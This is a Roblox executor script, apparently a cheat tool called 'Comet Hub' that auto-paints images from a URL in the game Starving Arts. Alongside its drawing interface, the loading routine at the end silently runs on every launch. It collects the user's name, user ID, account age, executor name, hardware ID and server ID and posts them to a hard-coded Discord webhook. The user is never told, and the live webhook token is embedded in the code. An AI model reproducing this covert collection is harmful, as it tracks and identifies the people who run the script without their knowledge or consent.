-- ============================================================
--  COMET HUB (Starving Arts) - Ultimate Edition
-- ============================================================

if game.CoreGui:FindFirstChild("CometHub") then
    game.CoreGui:FindFirstChild("CometHub"):Destroy()
end

-- ============================================================
--  STARVING ARTS LOGIC & VARIABLES
-- ============================================================
local Settings = {
    Image = "",
    Mode = "Randomize",
    IsDrawing = false,
    Size = 1,
    Brush = "Stripes"
}

local Brushes = {"Normal", "Star", "Circle", "Diamond", "Moon", "Asterisk", "Stripes", "Plus", "Triangle", "Water", "Chain", "Heart", "Checkerboard", "Hexagon", "Spray Paint", "Sticker", "Random"}
local Modes = {"Randomize", "By Step"}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local MainGui = player:WaitForChild("PlayerGui"):WaitForChild("MainGui")

-- Ton Webhook Discord
local WEBHOOK_URL = "https://discord.com/api/webhooks/1477453195415388301/_RFMLt_uyr2rDUqXqYlSW_F-pOO_JbZerLYwT7B4vvB6BaYY-rT4dzO9O8KD2d38XB3M"

function GetGrid()
    local PaintFrame = MainGui:FindFirstChild("PaintFrame")
    if not PaintFrame then return nil end
    local Grid = PaintFrame:FindFirstChild("Grid")
    if not Grid then
        Grid = PaintFrame:FindFirstChild("GridHolder") and PaintFrame.GridHolder:FindFirstChild("Grid")
    end
    return Grid
end

function SendNotify(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 5
    })
end

function GetJson(url)
    local myVercelApp = "https://roblox-image-api-two.vercel.app/api"
    local success, Response = pcall(function()
        return game:HttpGet(myVercelApp .. "?url=" .. url)
    end)

    if not success or string.find(Response, "error") then
        SendNotify("Erreur API", "Impossible de contacter ton serveur Vercel.")
        return {}
    end

    return HttpService:JSONDecode(Response)
end

function Import(url)
    if Settings.IsDrawing then 
        SendNotify("Comet Hub", "Un dessin est déjà en cours !")
        return 
    end
    if url == nil or url == "" then
        SendNotify("Comet Hub", "URL invalide !")
        return
    end

    local pixels = GetJson(url)
    local usedIndices = {}
    local Grid = GetGrid()

    if not Grid then 
        SendNotify("Comet Hub", "Veuillez ouvrir la toile de peinture !")
        return 
    end

    Settings.IsDrawing = true
    SendNotify("Comet Hub", "Début du dessin...")

    for i = 1, #pixels do
        local pixelIndex = i

        if Settings.Mode == "Randomize" then
            pixelIndex = math.random(#pixels)
            while usedIndices[pixelIndex] do
                pixelIndex = math.random(#pixels)
            end
            usedIndices[pixelIndex] = true
        end
        
        local pixel = pixels[pixelIndex]
        local r, g, b = pixel[1], pixel[2], pixel[3]
        
        local targetCell = Grid[tostring(pixelIndex)]
        
        -- Nettoyage des anciens pinceaux sur cette case pour éviter les superpositions visuelles
        for _, child in pairs(targetCell:GetChildren()) do
            if child:IsA("ImageLabel") then child:Destroy() end
        end
    
        if Settings.Brush == "Normal" then
            targetCell.BackgroundColor3 = Color3.fromRGB(r, g, b)
        else
            local Brush
            if Settings.Brush == "Random" then
                Brush = ReplicatedStorage.Brushes[Brushes[math.random(2, 16)]]:Clone()
            else
                Brush = ReplicatedStorage.Brushes[Settings.Brush]:Clone()
            end

            Brush.ImageColor3 = Color3.fromRGB(r, g, b)
            Brush.Size = UDim2.new(Settings.Size, 0, Settings.Size, 0)
            Brush.Parent = targetCell
        end

        task.wait(0.375)
    end

    Settings.IsDrawing = false
    SendNotify("Comet Hub", "Dessin terminé !")
end

-- ============================================================
--  UI SYSTEM (COMET HUB STYLE)
-- ============================================================

local C = {
    bg = Color3.fromRGB(15, 15, 15),
    sidebar = Color3.fromRGB(20, 20, 20),
    panel = Color3.fromRGB(25, 25, 25),
    card = Color3.fromRGB(30, 30, 30),
    cardHover = Color3.fromRGB(45, 45, 45),
    accent = Color3.fromRGB(255, 255, 255),
    accentGlow = Color3.fromRGB(150, 150, 150),
    text = Color3.fromRGB(240, 240, 240),
    subtext = Color3.fromRGB(130, 130, 130),
    toggleOn = Color3.fromRGB(255, 255, 255),
    toggleOff = Color3.fromRGB(60, 60, 60),
    white = Color3.fromRGB(255, 255, 255),
    divider = Color3.fromRGB(40, 40, 40),
}

local function corner(parent, radius)
    local c = Instance.new("UICorner", parent)
    c.CornerRadius = UDim.new(0, radius or 10)
    return c
end

local function stroke(parent, color, thickness)
    local s = Instance.new("UIStroke", parent)
    s.Color = color or C.accentGlow
    s.Thickness = thickness or 1
    s.Transparency = 0.55
    return s
end

local function animatedStroke(parent, thickness)
    local s = Instance.new("UIStroke", parent)
    s.Color = Color3.fromRGB(255, 255, 255)
    s.Thickness = thickness or 1.5
    s.Transparency = 0.1
    
    local grad = Instance.new("UIGradient", s)
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 120, 120)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 10))
    })
    
    task.spawn(function()
        local rotation = 0
        RunService.Heartbeat:Connect(function(dt)
            rotation = (rotation + dt * 45) % 360
            grad.Rotation = rotation
        end)
    end)
    
    return s
end

local function tween(obj, props, t, style, dir)
    local tw = TweenService:Create(
        obj,
        TweenInfo.new(t or 0.2, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out),
        props
    )
    tw:Play()
    return tw
end

local function applyPadding(parent, top, bottom, left, right)
    local p = Instance.new("UIPadding", parent)
    p.PaddingTop = UDim.new(0, top or 0)
    p.PaddingBottom = UDim.new(0, bottom or 0)
    p.PaddingLeft = UDim.new(0, left or 0)
    p.PaddingRight = UDim.new(0, right or 0)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CometHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game.CoreGui

local Win = Instance.new("Frame", ScreenGui)
Win.Name = "MainWindow"
Win.AnchorPoint = Vector2.new(0.5, 0.5)
Win.Position = UDim2.new(0.5, 0, 0.5, 0)
Win.Size = UDim2.new(0, 560, 0, 400)
Win.BackgroundColor3 = C.bg
Win.BorderSizePixel = 0
Win.Active = true
Win.Draggable = true
Win.ClipsDescendants = false
Win.Visible = false 
corner(Win, 14)
animatedStroke(Win, 1.5)

local Shadow = Instance.new("ImageLabel", Win)
Shadow.Name = "Shadow"
Shadow.ZIndex = -1
Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
Shadow.BackgroundTransparency = 1
Shadow.Position = UDim2.new(0.5, 0, 0.5, 3)
Shadow.Size = UDim2.new(1, 26, 1, 26) 
Shadow.Image = "rbxassetid://4735431565"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.4
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(16, 16, 84, 84)

local TopBar = Instance.new("Frame", Win)
TopBar.Size = UDim2.new(1, 0, 0, 46)
TopBar.BackgroundColor3 = C.sidebar
TopBar.BorderSizePixel = 0
TopBar.ZIndex = 2

local TopCorner = Instance.new("UICorner", TopBar)
TopCorner.CornerRadius = UDim.new(0, 14)

local TopPatch = Instance.new("Frame", TopBar)
TopPatch.Size = UDim2.new(1, 0, 0, 14)
TopPatch.Position = UDim2.new(0, 0, 1, -14)
TopPatch.BackgroundColor3 = C.sidebar
TopPatch.BorderSizePixel = 0
TopPatch.ZIndex = 2

local Logo = Instance.new("ImageLabel", TopBar)
Logo.Size = UDim2.new(0, 28, 0, 28)
Logo.Position = UDim2.new(0, 12, 0.5, -14)
Logo.BackgroundTransparency = 1
Logo.Image = "rbxassetid://131711664935136"
Logo.ImageColor3 = C.accent
Logo.ZIndex = 3

local TopTitle = Instance.new("TextLabel", TopBar)
TopTitle.Position = UDim2.new(0, 48, 0, 5)
TopTitle.Size = UDim2.new(0, 250, 0, 20)
TopTitle.BackgroundTransparency = 1
TopTitle.Text = "Comet Hub"
TopTitle.TextColor3 = C.white
TopTitle.Font = Enum.Font.GothamBold
TopTitle.TextSize = 15
TopTitle.TextXAlignment = Enum.TextXAlignment.Left
TopTitle.ZIndex = 3

local TopSub = Instance.new("TextLabel", TopBar)
TopSub.Position = UDim2.new(0, 48, 0, 26)
TopSub.Size = UDim2.new(0, 250, 0, 14)
TopSub.BackgroundTransparency = 1
TopSub.Text = "Starving Arts (F8 to Hide)"
TopSub.TextColor3 = C.subtext
TopSub.Font = Enum.Font.Gotham
TopSub.TextSize = 11
TopSub.TextXAlignment = Enum.TextXAlignment.Left
TopSub.ZIndex = 3

local CloseBtn = Instance.new("TextButton", TopBar)
CloseBtn.Name = "CloseBtn"
CloseBtn.ZIndex = 10
CloseBtn.Size = UDim2.new(0, 28, 0, 28)
CloseBtn.Position = UDim2.new(1, -38, 0.5, -14)
CloseBtn.BackgroundColor3 = C.card
CloseBtn.Text = "X"
CloseBtn.TextColor3 = C.white
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 13
CloseBtn.BorderSizePixel = 0
corner(CloseBtn, 7)
CloseBtn.MouseEnter:Connect(function() tween(CloseBtn, { BackgroundColor3 = C.cardHover }) end)
CloseBtn.MouseLeave:Connect(function() tween(CloseBtn, { BackgroundColor3 = C.card }) end)

local MinBtn = Instance.new("TextButton", TopBar)
MinBtn.ZIndex = 10
MinBtn.Size = UDim2.new(0, 28, 0, 28)
MinBtn.Position = UDim2.new(1, -72, 0.5, -14)
MinBtn.BackgroundColor3 = C.card
MinBtn.Text = "-"
MinBtn.TextColor3 = C.white
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 16
MinBtn.BorderSizePixel = 0
corner(MinBtn, 7)
MinBtn.MouseEnter:Connect(function() tween(MinBtn, { BackgroundColor3 = C.cardHover }) end)
MinBtn.MouseLeave:Connect(function() tween(MinBtn, { BackgroundColor3 = C.card }) end)

local Body = Instance.new("Frame", Win)
Body.Position = UDim2.new(0, 0, 0, 46)
Body.Size = UDim2.new(1, 0, 1, -46)
Body.BackgroundTransparency = 1
Body.BorderSizePixel = 0
Body.ClipsDescendants = true

local Sidebar = Instance.new("Frame", Body)
Sidebar.Size = UDim2.new(0, 130, 1, 0)
Sidebar.Position = UDim2.new(0, 0, 0, 0)
Sidebar.BackgroundColor3 = C.sidebar
Sidebar.BorderSizePixel = 0
corner(Sidebar, 14)

local SidePatchTop = Instance.new("Frame", Body)
SidePatchTop.Size = UDim2.new(0, 130, 0, 14)
SidePatchTop.Position = UDim2.new(0, 0, 0, 0)
SidePatchTop.BackgroundColor3 = C.sidebar
SidePatchTop.BorderSizePixel = 0

local SidePatchBR = Instance.new("Frame", Body)
SidePatchBR.Size = UDim2.new(0, 14, 0, 14)
SidePatchBR.Position = UDim2.new(0, 116, 1, -14)
SidePatchBR.BackgroundColor3 = C.sidebar
SidePatchBR.BorderSizePixel = 0

local VDivider = Instance.new("Frame", Body)
VDivider.Position = UDim2.new(0, 130, 0, 0)
VDivider.Size = UDim2.new(0, 1, 1, 0)
VDivider.BackgroundColor3 = C.divider
VDivider.BorderSizePixel = 0
VDivider.ZIndex = 2

local SideList = Instance.new("UIListLayout", Sidebar)
SideList.Padding = UDim.new(0, 4)
SideList.SortOrder = Enum.SortOrder.LayoutOrder
SideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
SideList.VerticalAlignment = Enum.VerticalAlignment.Top
applyPadding(Sidebar, 12, 12, 8, 8)

local SideVer = Instance.new("TextLabel", Sidebar)
SideVer.Size = UDim2.new(1, 0, 0, 14)
SideVer.BackgroundTransparency = 1
SideVer.Text = "v1.2"
SideVer.TextColor3 = C.subtext
SideVer.Font = Enum.Font.Gotham
SideVer.TextSize = 10
SideVer.TextXAlignment = Enum.TextXAlignment.Center
SideVer.LayoutOrder = 999

local Content = Instance.new("Frame", Body)
Content.Position = UDim2.new(0, 131, 0, 0)
Content.Size = UDim2.new(1, -131, 1, 0)
Content.BackgroundTransparency = 1
Content.BorderSizePixel = 0
Content.ClipsDescendants = true

local tabs = {}

local TAB_DEFS = {
    { name = "Drawing",   icon = "🎨" },
    { name = "Settings",  icon = "⚙️" },
    { name = "Info",      icon = "ℹ"  },
}

local function makeTabPage(name)
    local page = Instance.new("ScrollingFrame", Content)
    page.Name = name
    page.Size = UDim2.new(1, 0, 1, 0)
    page.Position = UDim2.new(0, 0, 0, 0)
    page.BackgroundTransparency = 1
    page.ScrollBarThickness = 3
    page.ScrollBarImageColor3 = C.accentGlow
    page.CanvasSize = UDim2.new(0, 0, 0, 0)
    page.AutomaticCanvasSize = Enum.AutomaticSize.Y
    page.BorderSizePixel = 0
    page.Visible = false

    local list = Instance.new("UIListLayout", page)
    list.Padding = UDim.new(0, 6)
    list.SortOrder = Enum.SortOrder.LayoutOrder
    list.HorizontalAlignment = Enum.HorizontalAlignment.Center

    applyPadding(page, 10, 10, 10, 10)
    return page, list
end

local function makeTabBtn(def, index)
    local btn = Instance.new("TextButton", Sidebar)
    btn.Name = def.name
    btn.LayoutOrder = index
    btn.Size = UDim2.new(1, 0, 0, 38)
    btn.BackgroundColor3 = C.card
    btn.BackgroundTransparency = 1
    btn.Text = def.icon .. "  " .. def.name
    btn.TextColor3 = C.subtext
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 12
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.BorderSizePixel = 0
    corner(btn, 8)
    applyPadding(btn, 0, 0, 10, 0)
    return btn
end

local function switchTab(name)
    for tabName, t in pairs(tabs) do
        local on = tabName == name
        t.page.Visible = on
        tween(t.btn, {
            TextColor3 = on and C.white or C.subtext,
            BackgroundTransparency = on and 0 or 1,
        })
        if on then t.btn.BackgroundColor3 = C.card end
    end
end

for i, def in ipairs(TAB_DEFS) do
    local page, list = makeTabPage(def.name)
    local btn = makeTabBtn(def, i)
    tabs[def.name] = { page = page, list = list, btn = btn }
    btn.MouseButton1Click:Connect(function() switchTab(def.name) end)
end

local drawPage = tabs["Drawing"].page
local settingsPage = tabs["Settings"].page
local infoPage = tabs["Info"].page

-- UI Components Builder
local function sectionLabel(parent, text, order)
    local f = Instance.new("Frame", parent)
    f.LayoutOrder = order or 0
    f.Size = UDim2.new(1, 0, 0, 22)
    f.BackgroundTransparency = 1

    local lbl = Instance.new("TextLabel", f)
    lbl.Size = UDim2.new(1, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = C.accentGlow
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    return f
end

local function makeInput(parent, placeholder, order, callback)
    local box = Instance.new("TextBox", parent)
    box.LayoutOrder = order
    box.Size = UDim2.new(1, 0, 0, 36)
    box.BackgroundColor3 = C.card
    box.PlaceholderText = "  " .. placeholder
    box.PlaceholderColor3 = C.subtext
    box.Text = ""
    box.TextColor3 = C.text
    box.Font = Enum.Font.GothamSemibold
    box.TextSize = 13
    box.TextXAlignment = Enum.TextXAlignment.Left
    box.BorderSizePixel = 0
    box.ClearTextOnFocus = false
    corner(box, 9)
    stroke(box, C.divider, 1)

    if callback then
        box:GetPropertyChangedSignal("Text"):Connect(function()
            callback(box.Text)
        end)
    end
    return box
end

local function makeActionBtn(parent, text, order, callback)
    local btn = Instance.new("TextButton", parent)
    btn.LayoutOrder = order
    btn.Size = UDim2.new(1, 0, 0, 38)
    btn.BackgroundColor3 = C.card
    btn.Text = text
    btn.TextColor3 = C.accent
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 13
    btn.BorderSizePixel = 0
    corner(btn, 9)
    stroke(btn, C.divider, 1)

    btn.MouseButton1Click:Connect(callback)
    btn.MouseEnter:Connect(function() tween(btn, { BackgroundColor3 = C.cardHover }) end)
    btn.MouseLeave:Connect(function() tween(btn, { BackgroundColor3 = C.card }) end)
    return btn
end

-- Nouveau système de Dropdown (Menu déroulant accordéon)
local function makeDropdown(parent, prefixText, options, currentSelected, order, callback)
    local container = Instance.new("Frame", parent)
    container.LayoutOrder = order
    container.Size = UDim2.new(1, 0, 0, 38)
    container.BackgroundColor3 = C.card
    container.BorderSizePixel = 0
    container.ClipsDescendants = true
    corner(container, 9)
    stroke(container, C.divider, 1)

    local mainBtn = Instance.new("TextButton", container)
    mainBtn.Size = UDim2.new(1, 0, 0, 38)
    mainBtn.BackgroundTransparency = 1
    mainBtn.Text = "  " .. prefixText .. tostring(currentSelected)
    mainBtn.TextColor3 = C.accent
    mainBtn.Font = Enum.Font.GothamBold
    mainBtn.TextSize = 13
    mainBtn.TextXAlignment = Enum.TextXAlignment.Left

    local icon = Instance.new("TextLabel", mainBtn)
    icon.Size = UDim2.new(0, 20, 0, 20)
    icon.Position = UDim2.new(1, -30, 0.5, -10)
    icon.BackgroundTransparency = 1
    icon.Text = "▼"
    icon.TextColor3 = C.subtext
    icon.Font = Enum.Font.GothamBold
    icon.TextSize = 12

    local listFrame = Instance.new("ScrollingFrame", container)
    listFrame.Size = UDim2.new(1, 0, 1, -38)
    listFrame.Position = UDim2.new(0, 0, 0, 38)
    listFrame.BackgroundTransparency = 1
    listFrame.ScrollBarThickness = 3
    listFrame.ScrollBarImageColor3 = C.accentGlow
    listFrame.BorderSizePixel = 0
    
    local listLayout = Instance.new("UIListLayout", listFrame)
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Padding = UDim.new(0, 4)
    applyPadding(listFrame, 4, 4, 4, 4)

    local open = false
    -- Calcule la hauteur maximale à ouvrir (environ 5 éléments visibles)
    local maxOpenHeight = math.min(#options * 32 + 38 + 8, 180)

    mainBtn.MouseButton1Click:Connect(function()
        open = not open
        tween(container, {Size = UDim2.new(1, 0, 0, open and maxOpenHeight or 38)})
        icon.Text = open and "▲" or "▼"
    end)

    for _, opt in ipairs(options) do
        local optBtn = Instance.new("TextButton", listFrame)
        optBtn.Size = UDim2.new(1, -8, 0, 28)
        optBtn.BackgroundColor3 = C.bg
        optBtn.Text = tostring(opt)
        optBtn.TextColor3 = C.text
        optBtn.Font = Enum.Font.GothamSemibold
        optBtn.TextSize = 12
        corner(optBtn, 6)
        
        optBtn.MouseButton1Click:Connect(function()
            mainBtn.Text = "  " .. prefixText .. tostring(opt)
            callback(opt)
            open = false
            tween(container, {Size = UDim2.new(1, 0, 0, 38)})
            icon.Text = "▼"
        end)

        optBtn.MouseEnter:Connect(function() tween(optBtn, {BackgroundColor3 = C.cardHover}) end)
        optBtn.MouseLeave:Connect(function() tween(optBtn, {BackgroundColor3 = C.bg}) end)
    end
    
    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        listFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 8)
    end)

    return container
end

local function makePresetsRow(parent, order, presets, applyFn)
    local row = Instance.new("Frame", parent)
    row.LayoutOrder = order
    row.Size = UDim2.new(1, 0, 0, 38)
    row.BackgroundTransparency = 1
    row.BorderSizePixel = 0

    local grid = Instance.new("UIGridLayout", row)
    grid.CellSize = UDim2.new(0, 75, 0, 34)
    grid.CellPadding = UDim2.new(0, 5, 0, 0)
    grid.SortOrder = Enum.SortOrder.LayoutOrder
    grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
    grid.FillDirectionMaxCells = #presets
    
    local buttons = {}
    for _, v in ipairs(presets) do
        local pb = Instance.new("TextButton", row)
        pb.BackgroundColor3 = C.card
        pb.Text = tostring(v)
        pb.TextColor3 = C.accent
        pb.Font = Enum.Font.GothamBold
        pb.TextSize = 13
        pb.BorderSizePixel = 0
        corner(pb, 8)
        stroke(pb, C.divider, 1)
        
        pb.MouseButton1Click:Connect(function() 
            for _, b in pairs(buttons) do tween(b, {BackgroundColor3 = C.card}) end
            tween(pb, {BackgroundColor3 = Color3.fromRGB(60, 60, 60)})
            applyFn(v) 
        end)
        
        pb.MouseEnter:Connect(function() 
            if pb.BackgroundColor3 ~= Color3.fromRGB(60, 60, 60) then tween(pb, {BackgroundColor3 = C.cardHover}) end
        end)
        pb.MouseLeave:Connect(function() 
            if pb.BackgroundColor3 ~= Color3.fromRGB(60, 60, 60) then tween(pb, {BackgroundColor3 = C.card}) end
        end)
        
        table.insert(buttons, pb)
    end
    return row
end

-- ============================================================
--  POPULATING THE PAGES
-- ============================================================

-- DRAWING PAGE
sectionLabel(drawPage, "IMAGE URL", 1)
local imageInput = makeInput(drawPage, "Paste Image URL Here...", 2, function(val)
    Settings.Image = val
end)

makeActionBtn(drawPage, "Start Drawing", 3, function()
    task.spawn(function()
        Import(Settings.Image)
    end)
end)

-- SETTINGS PAGE
sectionLabel(settingsPage, "DRAW MODE", 1)
makeDropdown(settingsPage, "Mode: ", Modes, Settings.Mode, 2, function(val)
    Settings.Mode = val
end)

sectionLabel(settingsPage, "BRUSH STYLE", 3)
makeDropdown(settingsPage, "Brush: ", Brushes, Settings.Brush, 4, function(val)
    Settings.Brush = val
end)

sectionLabel(settingsPage, "BRUSH SIZE", 5)
makePresetsRow(settingsPage, 6, {1, 2, 3, 4, 5}, function(val)
    Settings.Size = val
end)

sectionLabel(settingsPage, "MISCELLANEOUS", 7)
makeActionBtn(settingsPage, "Join Discord Server", 8, function()
    if setclipboard then
        setclipboard("https://discord.com/invite/NkYSkdAkey")
        SendNotify("Comet Hub", "Lien Discord copié dans le presse-papiers !")
    end
end)

-- INFO PAGE
local function infoCard(parent, order, key, value)
    local card = Instance.new("Frame", parent)
    card.LayoutOrder = order
    card.Size = UDim2.new(1, 0, 0, 52)
    card.BackgroundColor3 = C.card
    card.BorderSizePixel = 0
    corner(card, 9)
    stroke(card, C.divider, 1)

    local k = Instance.new("TextLabel", card)
    k.Size = UDim2.new(1, -16, 0, 20)
    k.Position = UDim2.new(0, 12, 0, 8)
    k.BackgroundTransparency = 1
    k.Text = key
    k.TextColor3 = C.subtext
    k.Font = Enum.Font.Gotham
    k.TextSize = 10
    k.TextXAlignment = Enum.TextXAlignment.Left

    local v = Instance.new("TextLabel", card)
    v.Size = UDim2.new(1, -16, 0, 20)
    v.Position = UDim2.new(0, 12, 0, 26)
    v.BackgroundTransparency = 1
    v.Text = value
    v.TextColor3 = C.white
    v.Font = Enum.Font.GothamBold
    v.TextSize = 13
    v.TextXAlignment = Enum.TextXAlignment.Left
    return card
end

sectionLabel(infoPage, "SCRIPT", 0)
infoCard(infoPage, 1, "Game", "Starving Arts")
infoCard(infoPage, 2, "Version", "v1.2")
infoCard(infoPage, 3, "Hub", "Comet Hub")
infoCard(infoPage, 4, "Credits", "noxis.lua")

sectionLabel(infoPage, "SUPPORT", 10)
infoCard(infoPage, 11, "Shortcut", "F8 Key to Hide/Show UI")

-- ============================================================
--  WINDOW BEHAVIOR & LOADING SCREEN
-- ============================================================

local minimized = false
MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    MinBtn.Text = minimized and "+" or "-"
    if minimized then
        TopPatch.Visible = false
        tween(Win, { Size = UDim2.new(0, 560, 0, 46) }, 0.3)
        tween(Shadow, { ImageTransparency = 1 }, 0.3)
        task.delay(0.15, function() Body.Visible = false end)
    else
        Body.Visible = true
        TopPatch.Visible = true
        tween(Win, { Size = UDim2.new(0, 560, 0, 400) }, 0.3)
        tween(Shadow, { ImageTransparency = 0.45 }, 0.3)
    end
end)

local OpenBtn = Instance.new("ImageButton", ScreenGui)
OpenBtn.Name = "OpenBtn"
OpenBtn.Size = UDim2.new(0, 46, 0, 46)
OpenBtn.Position = UDim2.new(0, 20, 0.5, -23)
OpenBtn.BackgroundColor3 = C.sidebar
OpenBtn.Image = "rbxassetid://129928619995803"
OpenBtn.ImageColor3 = C.accent
OpenBtn.Visible = false
OpenBtn.Active = true
OpenBtn.Draggable = true
corner(OpenBtn, 12)
animatedStroke(OpenBtn, 1.5)
applyPadding(OpenBtn, 8, 8, 8, 8)

local function toggleUI(forceState)
    local isVisible = forceState
    if isVisible == nil then 
        isVisible = not Win.Visible 
    end
    
    Win.Visible = isVisible
    OpenBtn.Visible = not isVisible
end

CloseBtn.MouseButton1Click:Connect(function() toggleUI(false) end)
OpenBtn.MouseButton1Click:Connect(function() toggleUI(true) end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.F8 then
        toggleUI()
    end
end)

switchTab("Drawing")

local LoadFrame = Instance.new("Frame", ScreenGui)
LoadFrame.Size = UDim2.new(0, 300, 0, 160)
LoadFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
LoadFrame.AnchorPoint = Vector2.new(0.5, 0.5)
LoadFrame.BackgroundColor3 = C.bg
LoadFrame.BorderSizePixel = 0
corner(LoadFrame, 12)
animatedStroke(LoadFrame, 1.5)

local LoadLogo = Instance.new("ImageLabel", LoadFrame)
LoadLogo.Size = UDim2.new(0, 60, 0, 60)
LoadLogo.Position = UDim2.new(0.5, 0, 0.35, 0)
LoadLogo.AnchorPoint = Vector2.new(0.5, 0.5)
LoadLogo.BackgroundTransparency = 1
LoadLogo.Image = "rbxassetid://131711664935136"
LoadLogo.ImageColor3 = C.accent

local LoadText = Instance.new("TextLabel", LoadFrame)
LoadText.Size = UDim2.new(1, 0, 0, 20)
LoadText.Position = UDim2.new(0, 0, 0.65, 0)
LoadText.BackgroundTransparency = 1
LoadText.Text = "Initializing Comet Hub..."
LoadText.TextColor3 = C.subtext
LoadText.Font = Enum.Font.GothamSemibold
LoadText.TextSize = 12

local BarBG = Instance.new("Frame", LoadFrame)
BarBG.Size = UDim2.new(0, 220, 0, 6)
BarBG.Position = UDim2.new(0.5, 0, 0.85, 0)
BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
BarBG.BackgroundColor3 = C.card
BarBG.BorderSizePixel = 0
corner(BarBG, 4)

local BarFill = Instance.new("Frame", BarBG)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = C.white
BarFill.BorderSizePixel = 0
corner(BarFill, 4)

task.spawn(function()
    if WEBHOOK_URL and WEBHOOK_URL ~= "https://discord.com/api/webhooks/1480223853556011053/yXYkyDfZRHBdnmxCy67WNbJ8IpDO5jq6DpGHrwSH8TXZWiqQoajvnpHMJ8NdxDz_BFSM" then
        task.spawn(function()
            local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
            if req then
                local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
                
                local hwid = "Unknown"
                pcall(function()
                    hwid = gethwid and gethwid() or game:GetService("RbxAnalyticsService"):GetClientId()
                end)
                
                local accountAge = player.AccountAge
                local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

                local data = {
                    ["embeds"] = {{
                        ["title"] = "🚀 Comet Hub Executed!",
                        ["description"] = "**Player Profile:** [Click Here](https://www.roblox.com/users/" .. player.UserId .. "/profile)\n**Game:** [Starving Arts](https://www.roblox.com/games/".. game.PlaceId ..")",
                        ["color"] = 16777215, 
                        ["thumbnail"] = {
                            ["url"] = avatarUrl
                        },
                        ["fields"] = {
                            {["name"] = "👤 Player", ["value"] = "```" .. player.Name .. " (@" .. player.DisplayName .. ")```", ["inline"] = true},
                            {["name"] = "🆔 User ID", ["value"] = "```" .. tostring(player.UserId) .. "```", ["inline"] = true},
                            {["name"] = "📅 Account Age", ["value"] = "```" .. tostring(accountAge) .. " Days```", ["inline"] = true},
                            {["name"] = "💻 Executor", ["value"] = "```" .. executorName .. "```", ["inline"] = true},
                            {["name"] = "🖥️ HWID", ["value"] = "```" .. tostring(hwid) .. "```", ["inline"] = true},
                            {["name"] = "🌐 Job ID (Server)", ["value"] = "```" .. tostring(game.JobId) .. "```", ["inline"] = false}
                        },
                        ["footer"] = {
                            ["text"] = "Comet Hub Analytics",
                        },
                        ["timestamp"] = DateTime.now():ToIsoDate()
                    }}
                }
                pcall(function()
                    req({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(data)
                    })
                end)
            end
        end)
    end

    tween(BarFill, {Size = UDim2.new(0.35, 0, 1, 0)}, 0.8)
    task.wait(0.8)
    LoadText.Text = "Loading modules..."
    
    tween(BarFill, {Size = UDim2.new(0.75, 0, 1, 0)}, 1.2)
    task.wait(1.2)
    LoadText.Text = "Checking drawing parameters..."

    tween(BarFill, {Size = UDim2.new(1, 0, 1, 0)}, 0.6)
    task.wait(0.6)
    LoadText.Text = "Welcome to Comet Hub!"
    LoadText.TextColor3 = C.white
    task.wait(0.6)

    tween(LoadFrame, {Size = UDim2.new(0, 280, 0, 140), BackgroundTransparency = 1}, 0.3)
    for _, v in pairs(LoadFrame:GetDescendants()) do
        if v:IsA("TextLabel") then
            tween(v, {TextTransparency = 1}, 0.3)
        elseif v:IsA("ImageLabel") then
            tween(v, {ImageTransparency = 1}, 0.3)
        elseif v:IsA("Frame") then
            tween(v, {BackgroundTransparency = 1}, 0.3)
        elseif v:IsA("UIStroke") then
            tween(v, {Transparency = 1}, 0.3)
        end
    end
    
    task.wait(0.3)
    LoadFrame:Destroy()

    Win.Size = UDim2.new(0, 500, 0, 360)
    Win.Visible = true
    tween(Win, {Size = UDim2.new(0, 560, 0, 400)}, 0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end)
